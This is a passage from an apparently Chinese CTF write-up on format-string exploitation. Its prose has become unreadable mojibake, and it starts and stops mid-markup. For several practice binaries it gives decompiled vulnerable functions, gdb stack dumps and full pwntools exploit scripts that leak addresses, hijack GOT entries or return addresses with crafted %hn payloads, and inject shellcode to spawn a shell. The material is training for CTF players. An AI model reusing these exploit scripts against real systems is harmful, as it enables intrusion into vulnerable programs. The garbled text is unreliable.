dir</code>,ä¼šè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œå…¶ä¸­è¾“å…¥getå‡½æ•°ï¼š</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>è¿™ä¸ªå‡½æ•°æ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œå½“ä½ putä¸Šå»ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒä¼šè®©ä½ è¾“å…¥æ–‡ä»¶åå­—å’Œæ–‡ä»¶å†…å®¹ï¼Œç„¶ågetè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®æ–‡ä»¶åå­—ï¼Œæ¥è¾“å‡ºå…¶å†…å®¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä¸€ä¸‹å°±å¯ä»¥å®ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨äº†ã€‚å¹¶ä¸”åœ¨dirä¸­ï¼Œå…¶ä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„åå­—ï¼Œç”¨çš„æ˜¯putså‡½æ•°ã€‚ç„¶åå°±æœ‰æ€è·¯åˆ©ç”¨äº†ï¼š</p><ul><li>ç”±äºæ²¡æœ‰systemå‡½æ•°ï¼Œç„¶åå°±éœ€è¦æƒ³åŠæ³•æ³„æ¼ä¸€ä¸‹libcåœ°å€ï¼Œæ¥ç®—å‡ºsystemçš„å‡½æ•°åœ¨libcçš„åœ°å€ã€‚</li><li>ä¿®æ”¹putså‡½æ•°çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶åè®°å¾—è¿™ä¸ªæ–‡ä»¶çš„åç§°æ˜¯<code>/bin/sh</code>,è¿™æ ·åœ¨ä½¿ç”¨dirè°ƒç”¨putså‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚<br>è¿™é¢˜æ¯”è¾ƒæœ‰è¶£ï¼Œæœ‰ç‚¹éš¾åœ¨åˆ†æè¿™ä¸ªç¨‹åºåœ¨å¹²å˜›ï¼Œåˆ©ç”¨æ€è·¯å€’æ˜¯ä¸éš¾ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme_k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme_k0</h2><h3 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotäº†ã€‚</p><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>å…¶ä¸­å‘ç°å…¶è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>å¹¶ä¸”è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œå°±å¯ä»¥å»ä¿®æ”¹ç¨‹åºçš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚<br>Gdbè°ƒè¯•å®šä½å…³é”®åœ¨è¿™ä¸ªprintfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œrdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚å¹¶ä¸”å‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œè¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºret addressï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†pieï¼Œè¿™æ—¶å€™å°±éœ€è¦æ¥æ³„æ¼ä¸€ä¸‹pieçš„åŸºåœ°å€ã€‚</p><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 = __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>ä»£ç æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿˜æ˜¯got hijack å°±è¡Œäº†ã€‚éš¾ç‚¹ä¹Ÿæ˜¯å¦‚ä½•æ¥å¤„ç†è¿™ä¸ªpieä¿æŠ¤ã€‚</p><h3 id="gdb-è°ƒè¯•"><a href="#gdb-è°ƒè¯•" class="headerlink" title="gdb è°ƒè¯•"></a>gdb è°ƒè¯•</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>æ‰¾åˆ°å…³é”®ç‚¹ï¼Œç„¶åçœ‹ä¸€ä¸‹æ ˆæƒ…å†µï¼š</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>å‘ç°åœ¨<code>0x7fffffffe1e0</code>è¿™é‡Œå°±å¯ä»¥æ³„æ¼å‡ºpieåŸºå€äº†ï¼Œç¡®å®šåç§»æ˜¯34ã€‚ç„¶åå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œç›´æ¥idaé‡Œé¢æŸ¥çœ‹ä¸‹pltå’Œgot ï¼ŒåŠ ä¸Šä»¥åå°±å¾—åˆ°äº†çœŸæ­£çš„<br>pltå’Œgotåœ°å€ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-â€”  </p><p>** æ¥ä¸‹æ¥çš„é¢˜ï¼Œéƒ½æ˜¯bufä¸å†æ ˆçš„ä¸Šçš„é¢˜ç›®ã€‚**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>å¯ä»¥çœ‹åˆ°nxä¿æŠ¤æ˜¯å…³é—­çš„ï¼Œå¯ä»¥æƒ³åŠæ³•åˆ©ç”¨shellcodeã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>æ¼æ´å‡½æ•°ï¼š</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>ä»£ç ååˆ†ç®€å•ï¼Œä½†æ˜¯è¿™æ¬¡çš„æ¼æ´å‡½æ•°å˜æˆäº†snprintf ï¼Œæ—¶åˆ»æ³¨æ„åç§»çš„è®¡ç®—æ˜¯é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ä¸”bufæ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œå·²ç»å˜å¾—ä¸æ˜¯æˆ‘ä»¬å½“åˆä¸€æ ·ååˆ†çš„å¥½æ§åˆ¶ï¼Œæ­¤æ—¶å°±éœ€è¦æƒ³åŠæ³•å¥½å¥½åˆ©ç”¨æ ˆä¸ŠåŸæ¥æœ‰çš„æ•°æ®ã€‚</p><h3 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µã€‚å¯ä»¥çœ‹åˆ°ä¸Šé¢æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„åœ°å€ä¿¡æ¯ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„ä¹Ÿæ˜¯ebpé“¾ ï¼š</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>ä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡å¯ä»¥é€šè¿‡åˆ©ç”¨0xffffd338ï¼ˆebp1ï¼‰è¿™ä¸ªåœ°å€ï¼Œå…¶æŒ‡å‘0xffffd358 ï¼ˆebp2ï¼‰ï¼Œç„¶ååˆ©ç”¨<code>%xc%4$hhn</code> å°±å¯ä»¥ä¿®æ”¹0xffffd378ï¼ˆebp3ï¼‰ã€‚</strong><br><strong>å°†0xffffd378 æ”¹ä¸ºæŒ‡å‘ret addressçš„æ ˆåœ°å€  <code>0xffffd33c</code>  ï¼š</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>æ”¹å®Œä¹Ÿå°±æ˜¯è¿™æ ·çš„æ•ˆæœã€‚<br><strong>è¿™æ ·å°±åˆå¯ä»¥é€šè¿‡åˆ©ç”¨ 0xffffd358 ï¼ˆebp2ï¼‰ï¼Œå…¶æŒ‡å‘ 0xffffd33cï¼ˆebp3ï¼‰ï¼Œ</strong><br><strong>æ¥ç€å°±ç®—ä¸€ä¸‹0xffffd358 ï¼ˆebp2ï¼‰çš„åç§» yï¼Œç„¶ååˆ©ç”¨<code>%xc%y$hhn</code> å°±å¯ä»¥ä¿®æ”¹0x804852cï¼ˆret addressï¼‰</strong></p><p>è¿™æ ·æ”»å‡»æ€è·¯ä¹Ÿå°±å‡ºæ¥äº†ï¼Œå¯ä»¥ä¿®æ”¹retaddress ï¼Œè¿”å›åœ¨å¯æ§çš„buf ä¸Šé¢æ”¾å¥½shellcode ï¼Œæ§åˆ¶ç¨‹åºè·³åˆ°shellcodeå³å¯ã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-5"><a href="#ä¿æŠ¤å’Œarch-5" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h3 id="idaåˆ†æ-6"><a href="#idaåˆ†æ-6" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>ä¸Šå±‚æœ‰play å’Œ mainå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œåœ¨ç¬¬ä¸‰å±‚çš„è¿™ä¸ªå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥åšé¢˜ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œä¹Ÿå°±ä»¥ä¸ºç€å¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ç„¶åè¿˜æ˜¯æ”¹è¿”å›åœ°å€ï¼Œæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h3 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ä¸ªé“¾å³å¯ã€‚å…ˆæƒ³åŠæ³•æŠŠ<code>Oxffffd358</code>  æ”¹æˆ <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>ç„¶ååœ¨æƒ³åŠæ³•æŠŠ0x8048507 è¿™ä¸ªè¿”å›åœ°å€æ”¹æˆæˆ‘ä»¬æ‘†æ”¾çš„shellcodeçš„åœ°å€å³å¯ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>è®°å¾—å‘å‡ºå»ä¸€æ¬¡payloadï¼Œä¸€å®šéœ€è¦æ¥å—ä¸€æ¬¡ï¼Œå†å»å‘ç¬¬äºŒä¸ªpayloadï¼Œé˜²æ­¢æ²¡æœ‰å®Œæˆä¸€ä¸ªprintfï¼Œå°±è®©ç¨‹åºæ¥å—å‘é€çš„ä¸œè¥¿ï¼Œè¿™æ ·å®¹æ˜“å´©æºƒã€‚</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="archå’Œä¿æŠ¤"><a href="#archå’Œä¿æŠ¤" class="headerlink" title="archå’Œä¿æŠ¤"></a>archå’Œä¿æŠ¤</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>å¼€äº†nxäº†ã€‚</p><h3 id="idaåˆ†æ-7"><a href="#idaåˆ†æ-7" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ§åˆ¶äº†å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¼æ´çš„æ¬¡æ•°ï¼Œåªå¯ä»¥åˆ©ç”¨4æ¬¡ã€‚</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>ä¸”è¿™ä¸€æ¡å¯ä»¥ç»™ä½ æ‹¿åˆ°shellã€‚</p><p>é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯æ”¹æ‰putsï¼Œsleepçš„gotè¡¨ï¼Œåˆ°è¿™ä¸ªæ‹¿å–shellçš„ä½ç½®å°±è¡Œã€‚<br>å› ä¸ºè¿™é‡Œä¸‹é¢å°±è°ƒç”¨ä¸€æ¬¡sleepï¼Œå°±æ”¹å®ƒå¥½äº†ï¼ŒåŸºæœ¬ä¸ä¼šå‡ºé—®é¢˜ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„æ±‡ç¼–ä»£ç ï¼Œå…¶ä¹Ÿæ˜¯è®©æ ˆçš„espå¤„äºä¸å®šçš„çŠ¶æ€ã€‚</p><h3 id="gdbåˆ†æ-1"><a href="#gdbåˆ†æ-1" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>æ­¤æ—¶çš„EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¢˜æ˜¯main -&gt; fsb ,ç”¨æˆ·ä»£ç åªæœ‰2å±‚å‡½æ•°çš„è°ƒç”¨ï¼Œçœ‹è¿™ä¸ªebp chainçš„æ—¶å€™å°±æœ‰ç‚¹ä¸æ–¹ä¾¿äº†ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„chainæ¥ä½¿ç”¨ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±åªèƒ½æŠŠebp3 çš„å€¼ï¼Œè‡ªå·±å†™ä¸Šå»ï¼Œå†™ä¸Šsleepçš„gotç„¶åå†æ”¹æˆæ‹¿shellçš„åœ°å€å°±è¡Œäº†ã€‚<br><img 